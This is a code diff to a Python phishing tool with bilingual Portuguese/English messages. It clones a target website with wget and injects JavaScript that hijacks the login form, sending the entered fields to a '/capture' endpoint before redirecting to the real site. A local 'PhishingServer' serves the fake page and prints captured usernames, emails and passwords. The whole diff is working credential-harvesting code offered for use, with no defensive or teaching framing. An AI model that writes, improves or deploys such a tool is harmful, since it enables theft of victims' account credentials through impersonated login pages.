@@ -12,6 +12,7 @@ import time
 import json
 import email
 import email.policy
+import wget
 from io import BytesIO
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
@@ -259,62 +260,63 @@ def clone_website(url, server_choice, language):
         print(f"Clonando {url} para login falso...")
 
     try:
-        # Fazendo requisição GET para obter o conteúdo da página
-        response = requests.get(url)
-        if response.status_code == 200:
-            # Parseando o conteúdo com BeautifulSoup
-            soup = BeautifulSoup(response.text, 'html.parser')
+        # Diretório para armazenar o conteúdo clonado
+        clone_dir = 'cloned_site'
+        os.makedirs(clone_dir, exist_ok=True)
 
-            # Inject the capture script into the cloned HTML
-            script = """
-            <script>
-                document.forms[0].addEventListener('submit', function(event) {
-                    event.preventDefault();
-                    var form = event.target;
-                    var formData = new FormData(form);
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('POST', '/capture');
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.onload = function() {
-                        window.location = '""" + url + """';
-                    };
-                    var object = {};
-                    formData.forEach((value, key) => object[key] = value);
-                    xhr.send(JSON.stringify(object));
-                });
-            </script>
-            """
+        # Usando wget para baixar todo o conteúdo do site
+        wget.download(url, clone_dir, bar=None)
 
-            # Inject the script before the closing </body> tag, or inside <head> if <body> is None
-            if soup.body:
-                soup.body.append(BeautifulSoup(script, 'html.parser'))
-            elif soup.head:
-                soup.head.append(BeautifulSoup(script, 'html.parser'))
-            else:
-                # Adiciona a tag <head> se não existir
-                head_tag = soup.new_tag('head')
-                soup.insert(0, head_tag)
-                head_tag.append(BeautifulSoup(script, 'html.parser'))
+        # Inject the capture script into the cloned HTML
+        index_file_path = os.path.join(clone_dir, 'index.html')
+        with open(index_file_path, 'r', encoding='utf-8') as file:
+            soup = BeautifulSoup(file, 'html.parser')
 
-            html_content = soup.prettify()
+        script = """
+        <script>
+            document.forms[0].addEventListener('submit', function(event) {
+                event.preventDefault();
+                var form = event.target;
+                var formData = new FormData(form);
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', '/capture');
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onload = function() {
+                    window.location = '""" + url + """';
+                };
+                var object = {};
+                formData.forEach((value, key) => object[key] = value);
+                xhr.send(JSON.stringify(object));
+            });
+        </script>
+        """
 
-            # Save the HTML content locally
-            with open('index.html', 'w', encoding='utf-8') as html_file:
-                html_file.write(html_content)
-
-            print("HTML downloaded successfully!")
-
-            # Continue to run the selected server (only localhost implemented)
-            if server_choice == '1':
-                run_local_server(url, language)
-
+        if soup.body:
+            soup.body.append(BeautifulSoup(script, 'html.parser'))
+        elif soup.head:
+            soup.head.append(BeautifulSoup(script, 'html.parser'))
         else:
-            print(f"Failed to clone {url}. Status code: {response.status_code}")
+            # Adiciona a tag <head> se não existir
+            head_tag = soup.new_tag('head')
+            soup.insert(0, head_tag)
+            head_tag.append(BeautifulSoup(script, 'html.parser'))
+
+        html_content = soup.prettify()
+
+        # Salvar o HTML modificado localmente
+        with open(index_file_path, 'w', encoding='utf-8') as file:
+            file.write(html_content)
+
+        print("Site cloned successfully!")
+
+        # Continuar com a execução no servidor selecionado (apenas localhost implementado)
+        if server_choice == '1':
+            run_local_server(clone_dir, url, language)
 
     except Exception as e:
         print(f"Error cloning website: {e}")
 
-def run_local_server(target_url, language):
+def run_local_server(clone_dir, target_url, language):
     clear_console()
     if language == '1':
         print("Running phishing site on localhost...")
@@ -322,26 +324,9 @@ def run_local_server(target_url, language):
         print("Executando site de phishing em localhost...")
 
     # Define the request handler
-    class PhishingServer(http.server.BaseHTTPRequestHandler):
-        def do_GET(self):
-            try:
-                if self.path == '/':
-                    self.path = '/index.html'
-                elif self.path == '/styles.css':
-                    pass  # Implement logic to serve the CSS file
-
-                # Serve the requested file
-                with open(os.path.join('.', self.path[1:]), 'rb') as file:
-                    self.send_response(200)
-                    if self.path.endswith('.html'):
-                        self.send_header('Content-type', 'text/html')
-                    elif self.path.endswith('.css'):
-                        self.send_header('Content-type', 'text/css')
-                    self.end_headers()
-                    self.wfile.write(file.read())
-
-            except FileNotFoundError:
-                self.send_error(404, 'File Not Found: %s' % self.path)
+    class PhishingServer(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=clone_dir, **kwargs)
 
         def do_POST(self):
             if self.path == '/capture':
@@ -353,17 +338,17 @@ def run_local_server(target_url, language):
                 print("Received data:", data)
 
                 # Captura das credenciais
-                username = data.get('username', '')
-                password = data.get('password', '')
+                username = data.get('email', data.get('username', ''))
+                password = data.get('pass', data.get('password', ''))
 
                 # Exibir credenciais no console
                 if language == '1':
                     print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
-                    print(f"Username: {username}")
+                    print(f"Username/Email: {username}")
                     print(f"Password: {password}")
                 else:
                     print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
-                    print(f"Nome de Usuário: {username}")
+                    print(f"Nome de Usuário/Email: {username}")
                     print(f"Senha: {password}")
 
                 # Redirecionar para a URL original após capturar as credenciais
@@ -389,16 +374,21 @@ def run_local_server(target_url, language):
         server.shutdown()
         server.server_close()
 
-        # Clean up the HTML and CSS files
-        clean_up_files()
+        # Clean up the cloned files
+        clean_up_files(clone_dir)
 
     except Exception as e:
         print(f"Error running local server: {e}")
 
-def clean_up_files():
+def clean_up_files(clone_dir):
     try:
-        os.remove('index.html')
-        os.remove('styles.css')
+        # Remove all files and directories within the cloned site directory
+        for root, dirs, files in os.walk(clone_dir, topdown=False):
+            for name in files:
+                os.remove(os.path.join(root, name))
+            for name in dirs:
+                os.rmdir(os.path.join(root, name))
+        os.rmdir(clone_dir)
     except Exception as e:
         print(f"Error cleaning up files: {e}")
 
